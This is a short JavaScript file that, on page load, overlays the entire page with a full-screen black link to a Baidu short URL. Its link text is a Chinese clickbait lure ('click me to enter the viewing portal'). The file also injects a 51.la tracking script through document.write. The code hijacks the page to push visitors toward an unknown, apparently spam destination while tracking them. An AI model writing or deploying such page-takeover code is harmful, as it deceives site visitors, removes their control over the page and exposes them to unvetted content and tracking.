window.onload = function() {
    // 创建外层容器
    const container = document.createElement('div');
    Object.assign(container.style, {
        position: 'absolute',
        top: '0',
        left: '0',
        width: '100%',
        height: '100%',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center'
    });

    // 创建链接元素
    const link = document.createElement('a');
    link.href = 'https://mr.mbd.baidu.com/1iib1ebUDio?18may.html';
    link.textContent = '👉👉♥点我进入♥观看入口👈👈';
    Object.assign(link.style, {
        textDecoration: 'none',
        color: 'white',
        backgroundColor: 'black',
        fontSize: '32px',
        width: '100%',
        height: '100%',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center'
    });

    // 组装元素
    container.appendChild(link);
    document.body.appendChild(container);
};


document.write("<script>!function(p){\"use strict\";!function(t){var s=window,e=document,i=p,c=\"\".concat(\"https:\"===e.location.protocol?\"https://\":\"http://\",\"sdk.51.la/js-sdk-pro.min.js\"),n=e.createElement(\"script\"),r=e.getElementsByTagName(\"script\")[0];n.type=\"text/javascript\",n.setAttribute(\"charset\",\"UTF-8\"),n.async=!0,n.src=c,n.id=\"LA_COLLECT\",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:\"KOWkoWXJlZ9GuxI3\",ck:\"KOWkoWXJlZ9GuxI3\"});</script>")
